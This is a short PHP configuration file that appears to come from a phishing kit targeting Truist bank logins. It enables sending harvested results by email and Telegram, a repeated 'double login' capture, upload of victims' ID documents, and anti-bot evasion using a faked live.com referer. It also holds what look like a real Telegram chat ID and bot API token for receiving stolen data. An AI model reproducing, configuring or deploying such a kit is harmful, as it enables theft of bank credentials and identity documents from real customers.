<?php

$settings = array(
    

	"send_mail"		=> "1",	// Send E-Mail 
	"save_results"	=> "1",	// Save Results 
	"telegram"		=> "1",
	"double_login"	=> "1", // Double Login
	"upload"		=> "1", // Turn Id Upload On or Off
	"chat_id"		=> "5153427813",	// Your Chat ID (ADD "-" BEFORE Chat ID) For Example: "-123456789"
	"bot_url"		=> "bot5428799942:AAF83GqG2bIRDX5S30lV65f_pW9V6QOqoxY",	// Your Bot API Key (ADD "bot" BEFORE API KEY)
	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
	"out"			=> "Truist+login",	// Outcome Of AntiBots Forward 
	"email"			=> "",	// Your E-Mail
);
return $settings;


?>
